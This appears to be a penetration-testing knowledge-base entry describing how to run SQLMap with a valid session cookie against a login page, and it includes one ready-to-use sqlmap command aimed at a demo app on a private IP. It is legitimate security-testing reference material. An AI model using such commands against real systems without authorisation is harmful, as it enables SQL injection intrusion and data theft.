---
id: ea63a5bc-51ea-4db7-9a8e-17d9e75b3e27
name: SQLMap Using Cookie With Session ID
type: procedure
verified: true
submitted: true
created_at: '2020-09-02T17:47:10.152653+00:00'
updated_at: '2023-05-26T18:21:03.632155+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[sqli]]'
- '[[SQL Injection]]'
- '[[Web Applications]]'
commands:
- '[[SQLMap Command With Session ID]]'
---

# SQLMap Using Cookie With Session ID

**Status**: ✓ Verified

## Summary

SQLMap is an automated SQL injection exploitation tool. The tool injects payloads from the input fields. Specifying a valid Session ID will help in accessing the URL without being redirected for authentication. 

## Description

# Description

SQLMap is an automated SQL injection exploitation tool. The tool injects payloads from the input fields. Specifying a valid Session ID will help in accessing the URL without being redirected for authentication.

# Procedure

# 

1. Use the below SQLMap command to test the application along with a valid Session ID

**Command** ([[SQLMap Command With Session ID]]):

```bash
sqlmap -u "http://192.168.1.10/vcart/login.php?user=demo@vcart.com&pass=demo&selop=2" --cookie='SESSION_ID=51feo6qnix2ct7k' -p user
```

2. The output shows the payloads used to exploit and data.

## Platforms

- Web

## Commands Used

- [[SQLMap Command With Session ID]]

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[sqli]]
- [[SQL Injection]]
- [[Web Applications]]
